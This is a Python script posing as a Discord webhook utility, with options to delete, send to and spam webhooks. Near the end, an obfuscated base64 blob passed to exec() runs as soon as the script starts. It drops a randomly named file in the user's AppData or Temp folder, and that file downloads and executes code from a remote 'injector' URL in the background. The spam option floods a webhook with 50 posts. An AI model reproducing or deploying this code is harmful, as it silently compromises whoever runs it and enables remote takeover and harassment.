import os
import requests
import colorama
from dhooks import Webhook
import time




os.system("title Webhook Tools                                                                                                                                                www.github.com/Fontesie")


def main():

    print(f"""{colorama.Fore.RED}
     

                                __      __      ___.   .__                   __             ___________           .__           
                               /  \    /  \ ____\_ |__ |  |__   ____   ____ |  | __  ______ \__    ___/___   ____ |  |   ______ 
                               \   \/\/   // __ \| __ \|  |  \ /  _ \ /  _ \|  |/ / /  ___/   |    | /  _ \ /  _ \|  |  /  ___/ 
                                \        /\  ___/| \_\ \   Y  (  <_> |  <_> )    <  \___ \    |    |(  <_> |  <_> )  |__\___ \  
                                 \__/\  /  \___  >___  /___|  /\____/ \____/|__|_ \/____  >   |____| \____/ \____/|____/____  > 
                                      \/       \/    \/     \/                   \/     \/                                  \/ 
                                                            
                                                                    

                                   .....                                                    ................                                    
                                 .....................                                        ........        ........                                
                              ......               ......                                  .....                    .....                             
                            ....                       .....                            .....                          ....                           
                          ....                           .....                         ....                              ....                         
                        ....                               ....                       ...                                  ...                        
                       ...                                   ...                    ....                                    ...                       
                      ...                                     ...                   ...                                      ...                      
                      ...                                     ....                 ...                                       ...                      
                     ...                                       .'...................'.                                        ...                     
                     ...                                       .,'................',,.                                        ...                     
                     ...                                       ....              .....                                        ...                     
                      ...                                   .:oxkkkxdc,.     .:oxxxdo:'                                      ...                      
                      ...                                 ,xXWMMMMMMMWNO, .;oKWMMMMMWWXk:.                                  ....                      
                       ...                               :KMMMMMMMMMMMMM0oONWMWMMMMMMMMMWk,                                 ...                       
                        ....                            ,0MMMMMMMMMMMMMMMWMMMMMMMWNNWMMMMW0,                              ....                        
                         ....                           oWMMMMMMMWXXWMMMMMMMMMMWXKXWMMMMMMWo                            ....                          
                           .....                       .kMMMMMMMMMKdOWMMMMMWMMWkxXMMMMMMMMMx.                         ....                            
                              ......                   .kMMMMMMMMWd.'xXWMMMWNKo.,0MMMMMMMMWo                      ......                              
                                 .............'..      .dWMMMMMMMXc   ;0MMWNx.  .xWMMMMMMMK;      .,'................                                 
                                       .......,'    ... 'OWMMMMMMNc   '0MMWWd.  .xWMMMMMMWd.       ',..........                                       
                                            .... .ckKKKOoxXMMMMMMWx.  ;KWWWNx.  ,0MMMMMMMXdlddl;.  ....                                               
                                             ....lXWMMMMMWWMWMMMMMXdldOKXXXXKxolOWMMMMMMMMMMMMMNk, ...                                                
                                             ....dNWX00XWMMMWWMMMMMNOooxddxxooONMMMMMMMMMMWWXXNMWd....                                                
                                              ...lKNNK0XWMMMMMMMMMMk. .;,,,,. .OMMMMMMMMMMMN0OKNWd'...                                                
                                              ...'dXWMN0OXWMMMMMMMMXd,.......;dXMMMMMMMMMWKKNWWW0;...                                                 
                                               ...,dXWMWOoxKWWMMMMMMWNXKKKKXXWMMMMMMMMMN0oxXWMW0:...                                                  
                                                ...'oKWMW0:'l0WMMMMMMWMMMMMMMMMMMMMMWXx;,oXMMNO;...                                                   
                                                 ....:ONWMXl.'lxOKKKXNWWWWWWWWNXKXKxc,.'kNMWKo,...                                                    
                                                   ...'l0NWWk'. .....,;;::::;,'....   :0WW0d;....                                                     
                                                    ....,cxKNKo.                    ,xXKxc,....                                                       
                                                      .....,:d00d;.              .:xOxc;....                                                          
                                                         .....,lx00koc:,,,,,;:ldkOxl,.....                                                            
                                                            .....':loxxxkkxxxxol:,....                                                                
                                                               .....................                                                                  
                                                                     .........                                                                                                                                                                               



                                                                      Webhook Tools
     """)

def webh():
    main()
    choice1 = input(f"{colorama.Fore.BLUE}                                                                  [1] Webhook Deleter\n                                                                  [2] Webhook Sender\n                                                                  [3] Webhook Spam\n                                                                  [4] Credit\n\n{colorama.Fore.RED}                                                                  Choice: ")


    if choice1 == "1":
        os.system("cls")    
        print(f"""{colorama.Fore.RED}
     

                                        __      __      ___.   .__                   __             ___________           .__           
                                       /  \    /  \ ____\_ |__ |  |__   ____   ____ |  | __  ______ \__    ___/___   ____ |  |   ______ 
                                       \   \/\/   // __ \| __ \|  |  \ /  _ \ /  _ \|  |/ / /  ___/   |    | /  _ \ /  _ \|  |  /  ___/ 
                                        \        /\  ___/| \_\ \   Y  (  <_> |  <_> )    <  \___ \    |    |(  <_> |  <_> )  |__\___ \  
                                         \__/\  /  \___  >___  /___|  /\____/ \____/|__|_ \/____  >   |____| \____/ \____/|____/____  > 
                                              \/       \/    \/     \/                   \/     \/                                  \/ 
                                                            
                                                                            
                                                                      Webhook Tools
     """)

        print(f'{colorama.Fore.BLUE}                                                    /!\ If the webhook does not work the tools crash')

        webhookdeleter = input(f"{colorama.Fore.RED} \nWebhook link: {colorama.Fore.WHITE}")

        webhookchecker = requests.get(webhookdeleter)
        if webhookchecker.status_code == 404:
            print("The webhook is non-existent or already deleted")
            time.sleep(2)
            os.system("cls")
            webh()
        if webhookchecker.status_code == 10015:
            print("The webhook is non-existent or already deleted")
            time.sleep(2)
            os.system("cls")
            webh()
        if webhookchecker.status_code == 401:
            print("The webhook is non-existent or already deleted")
            time.sleep(2)
            webh()
        else:
            hook = Webhook(webhookdeleter)
            print("     Wait...")
            x = requests.delete(webhookdeleter)
            print("     Webhook deleted.")
            time.sleep(3)
            os.system("cls")
            webh()
        

    if choice1 == "2":
        os.system("cls")
        print(f"""{colorama.Fore.RED}
     

                                        __      __      ___.   .__                   __             ___________           .__           
                                       /  \    /  \ ____\_ |__ |  |__   ____   ____ |  | __  ______ \__    ___/___   ____ |  |   ______ 
                                       \   \/\/   // __ \| __ \|  |  \ /  _ \ /  _ \|  |/ / /  ___/   |    | /  _ \ /  _ \|  |  /  ___/ 
                                        \        /\  ___/| \_\ \   Y  (  <_> |  <_> )    <  \___ \    |    |(  <_> |  <_> )  |__\___ \  
                                         \__/\  /  \___  >___  /___|  /\____/ \____/|__|_ \/____  >   |____| \____/ \____/|____/____  > 
                                              \/       \/    \/     \/                   \/     \/                                  \/ 
                                                            
                                                                            
                                                                      Webhook Tools
     """)
        print(f'{colorama.Fore.BLUE}                                                    /!\ If the webhook does not work the tools crash')
        webhooklink = input(f"{colorama.Fore.RED} \nWebhook link: {colorama.Fore.WHITE}")
        webhookmsg = input(f"{colorama.Fore.RED} \nMessage: {colorama.Fore.WHITE}")
        data = {
            "content" : "",
            "username" : "Webhook Tool"
        }
        data["embeds"] = [
        {
        "description" : f"{webhookmsg}",
        "title" : "Webhook Tool"
        }
]
        result = requests.post(webhooklink, json = data)
        print("\n\nMessage sended.")
        time.sleep(3)
        os.system("cls")
        webh()

    if choice1 == "3":
        os.system("cls")
        print(f"""{colorama.Fore.RED}
     

                                        __      __      ___.   .__                   __             ___________           .__           
                                       /  \    /  \ ____\_ |__ |  |__   ____   ____ |  | __  ______ \__    ___/___   ____ |  |   ______ 
                                       \   \/\/   // __ \| __ \|  |  \ /  _ \ /  _ \|  |/ / /  ___/   |    | /  _ \ /  _ \|  |  /  ___/ 
                                        \        /\  ___/| \_\ \   Y  (  <_> |  <_> )    <  \___ \    |    |(  <_> |  <_> )  |__\___ \  
                                         \__/\  /  \___  >___  /___|  /\____/ \____/|__|_ \/____  >   |____| \____/ \____/|____/____  > 
                                              \/       \/    \/     \/                   \/     \/                                  \/ 
                                                            
                                                                            
                                                                      Webhook Tools
     """)
        print(f'{colorama.Fore.BLUE}                                                    /!\ If the webhook does not work the tools crash')
        webhooklink = input(f"{colorama.Fore.RED} \nWebhook link: {colorama.Fore.WHITE}")
        webhookmsg = input(f"{colorama.Fore.RED} \nMessage: {colorama.Fore.WHITE}")
        data = {
            "content" : "",
            "username" : "Webhook Tool"
        }
        data["embeds"] = [
        {
        "description" : f"{webhookmsg}",
        "title" : "Webhook Tool"
        }
]

        count = 0
        while (count < 50):   
            count = count + 1
            print(f"{colorama.Fore.RED}Message sended")
            result = requests.post(webhooklink, json = data)
        print("\n\nSpam ended.")
        time.sleep(2)
        os.system("cls")
        webh()   

    if choice1 == "4":
        os.system("cls")
        print(f"""{colorama.Fore.RED}
     

                                        __      __      ___.   .__                   __             ___________           .__           
                                       /  \    /  \ ____\_ |__ |  |__   ____   ____ |  | __  ______ \__    ___/___   ____ |  |   ______ 
                                       \   \/\/   // __ \| __ \|  |  \ /  _ \ /  _ \|  |/ / /  ___/   |    | /  _ \ /  _ \|  |  /  ___/ 
                                        \        /\  ___/| \_\ \   Y  (  <_> |  <_> )    <  \___ \    |    |(  <_> |  <_> )  |__\___ \  
                                         \__/\  /  \___  >___  /___|  /\____/ \____/|__|_ \/____  >   |____| \____/ \____/|____/____  > 
                                              \/       \/    \/     \/                   \/     \/                                  \/ 
                                                            
                                                                            
                                                                      Webhook Tools
     """)
        print(f"{colorama.Fore.BLUE}Developer: {colorama.Fore.WHITE}Fontesie\n{colorama.Fore.BLUE}Discord: {colorama.Fore.WHITE}Fontesie#2621\n")
        input(f"\n\n{colorama.Fore.RED}Press ENTER to exit")
        os.system("cls")
        webh()




    else:
        os.system("cls")
        webh()

exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS1IOUpXTjItT08xOUhZLTFUNkxDMy1NWkU1WkYtSVc1WUVFJykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

main()
webh()